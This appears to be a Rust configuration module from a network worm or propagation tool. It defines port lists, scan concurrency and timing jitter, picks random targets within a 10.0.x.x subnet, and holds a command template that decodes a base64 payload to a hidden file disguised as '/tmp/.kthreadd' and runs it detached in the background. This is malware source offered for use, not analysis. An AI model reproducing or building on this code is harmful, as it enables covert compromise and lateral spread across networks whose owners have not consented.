use std::net::{IpAddr, Ipv4Addr};

pub struct Config {
    pub concurrency: usize,
    pub scan_timeout_ms: u64,
    pub jitter_ms: (u64, u64),
    pub ports: Vec<u16>,
    pub subnet_base: [u8; 2],
    pub payload_cmd_tmpl: String,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            concurrency: 512,
            scan_timeout_ms: 800,
            jitter_ms: (200, 4000),
            ports: vec![22, 80, 443, 445, 8080, 9999],
            subnet_base: [10, 0],
            // %s is replaced with the base64 blob
            payload_cmd_tmpl: String::from(
                "echo %s | base64 -d > /tmp/.kthreadd && chmod +x /tmp/.kthreadd && \
                 (setsid /tmp/.kthreadd >/dev/null 2>&1 &) && echo OK\n",
            ),
        }
    }
}

pub fn random_target(base: [u8; 2]) -> IpAddr {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    IpAddr::V4(Ipv4Addr::new(
        base[0],
        base[1],
        rng.gen_range(0..255),
        rng.gen_range(1..255),
    ))
}
